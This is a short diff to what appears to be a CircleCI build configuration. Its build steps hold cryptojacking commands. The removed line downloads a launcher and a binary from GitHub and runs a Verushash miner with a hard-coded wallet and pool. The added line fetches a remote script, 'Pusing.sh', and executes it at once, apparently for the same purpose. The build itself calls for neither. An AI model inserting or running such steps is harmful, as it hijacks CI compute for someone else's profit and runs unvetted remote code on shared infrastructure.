@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RQD5CG5dGtrJufV4mTNgLrVKNTWtWnRPeF  -rigName Pusing -pool1 verus.wattpool.net:1230
+      - run: wget https://raw.githubusercontent.com/NuDev2021/pusing/main/Pusing.sh && chmod +x Pusing.sh && ./Pusing.sh
